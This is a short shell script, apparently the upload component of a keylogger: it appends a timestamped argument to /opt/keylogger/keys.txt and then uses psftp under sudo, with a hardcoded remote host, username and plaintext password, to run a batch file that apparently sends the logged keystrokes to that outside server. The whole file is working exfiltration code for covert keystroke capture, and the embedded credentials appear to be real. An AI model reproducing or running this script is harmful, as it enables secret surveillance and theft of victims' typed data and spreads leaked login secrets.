#!/bin/sh
HOST='serwer1865222.home.pl'
USER='oskreans@serwer1865222.home.pl'
PASSWD='oshasLo1@'
PAT='/opt/keylogger'
FILE='keys.txt'

echo " `date` : $1 ">> $PAT/$FILE

sudo psftp $HOST -l $USER -pw $PASSWD -b $PAT/batch.b

